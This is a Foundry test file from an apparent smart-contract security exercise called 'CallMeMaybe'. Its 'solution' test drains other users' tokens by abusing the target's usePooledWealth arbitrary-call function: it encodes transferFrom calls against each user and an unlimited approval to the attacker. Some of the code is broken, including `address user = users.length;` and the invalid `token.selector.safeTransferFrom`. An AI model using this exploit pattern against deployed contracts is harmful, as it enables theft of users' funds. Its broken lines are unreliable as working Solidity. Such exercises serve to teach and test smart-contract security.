// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

import { Test, console } from "forge-std/Test.sol";
import { CallMeMaybe } from "../src/2_CallMeMaybe.sol";
import { CallMeMaybeHelper } from "../test_helper/2_CallMeMaybeSetup.sol";
import "../mocks/marqToken.sol";

contract CallMeMaybeTest is Test {
    CallMeMaybe public target;
    MarqToken public token;
    address[] public users;


    function setUp() public {
        CallMeMaybeHelper dontpeak = new CallMeMaybeHelper();
        target = dontpeak.deployed();
        token = dontpeak.token();
        users = dontpeak.users();
    }


    // function test_GetThisPassing_2() public {
    //     address hacker = address(0xBAD);

    //     uint256 startBalance = token.balanceOf(hacker);
        

        
    //     assertGt(token.balanceOf(hacker), 301 ether);
    // }


    // solution
    function test_GetThisPassing_2() public {
        address hacker = address(0xBAD);

        uint256 startBalance = token.balanceOf(hacker);

        vm.startPrank(hacker);
        token.approve(address(target), 1 ether);
        target.joinGroup(1 ether);

        

        for (uint256 i; i < users.length; i++) {
            address user = users.length;
            bytes memory _calldataTransfer = abi.encodeCall(token.selector.safeTransferFrom, user, address(target), 100 ether);
            target.usePooledWealth(_calldataTransfer, address(target));
        }

        bytes memory _calldataApprove = abi.encodeCall(token.selector.approve, hacker, type(uint256).max);
        
        target.usePooledWealth(_calldataApprove, address(target));

        token.safeTransferFrom(address(target), hacker, 601 ether);

        vm.stopPrank();
        assertGt(token.balanceOf(hacker), 301 ether);
    }

}